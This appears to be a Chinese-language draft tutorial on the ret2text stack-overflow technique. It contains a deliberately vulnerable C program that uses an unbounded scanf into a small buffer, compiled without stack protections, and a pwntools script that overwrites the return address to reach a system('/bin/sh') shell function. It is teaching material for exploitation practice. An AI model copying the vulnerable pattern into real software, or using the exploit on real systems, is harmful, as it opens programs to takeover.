---
title: "Ret2text"
description: "最简单的栈溢出"
lead: ""
date: 2023-03-28T20:20:10+08:00
lastmod: 2023-03-28T20:20:10+08:00
draft: true
images: []
menu:
  docs:
    parent: ""
    identifier: "ret2text-200f08ad839017711639abd549920f35"
weight: 999
toc: true
---

## 0x01 介绍

既然溢出可以覆盖局部变量，即利用栈三大功能之一保存局部变量，那么也可以利用栈三大功能之一保存函数返回后的地址，我们可以溢出覆盖函数返回后的地址为任意我们想要它返回执行的地方，从而实现getshell
![image-20230328202136766](./assets/image-20230328202136766.png)
举一个例子来说

```c
#include<stdio.h>
#include<stdlib.h>

void getshell() {	// getshell函数
	system("/bin/sh");
}

void run(){	// 写run函数的目的是为了简化，因为现在32位main函数需要绕过ecx
	char buf[0x10];	/* 局部变量 */
	printf("input: ");
	scanf("%s", buf);
}

int main(){
	run();
	return 0;
}
// gcc ret2text.c -o ret2text -m32 -fno-pic -no-pie -fno-stack-protector
```

按照正常的程序流程来说，main函数应该会返回执行\_libc\_start\_main中的指令，但是scanf的%s格式化控制符是可以无字符数限制输入造成栈溢出的，这样我们就可以想办法覆盖main函数的函数返回地址为程序中getshell函数的地址，从而执行 `system("/bin/sh");`
首先需要的是确定getshell函数的位置，这里可以用objdump之类的工具来查看
![image-20230328202143376](./assets/image-20230328202143376.png)
然后只需要将 `0x804849b` 写入函数返回地址即可，然后就是找buf变量到函数返回地址的偏移量
![image-20230328202148475](./assets/image-20230328202148475.png)
可以从main函数看出buf位于 `ebp-0x18` ，那么偏移量 = 0x18 + 4
写一个python脚本来进行实现攻击，并gdb来看看效果

```python
from pwn import*
context.terminal = ['tmux','splitw', '-h']
o = process("./ret2text")
payload = 'a'*(0x18 + 4) + p32(0x804849b)
gdb.attach(o)
o.sendline(payload)
o.interactive()
```

在进行覆盖前栈内容为
![image-20230328202153432](./assets/image-20230328202153432.png)
覆盖后将变为
![image-20230328202158440](./assets/image-20230328202158440.png)
运行到ret看它的跳转方向
![image-20230328202212249](./assets/image-20230328202212249.png)
这个时候esp指向了getshell函数，即跳转去执行getshell函数
![image-20230328202216325](./assets/image-20230328202216325.png)
继续执行
![image-20230328202220740](./assets/image-20230328202220740.png)

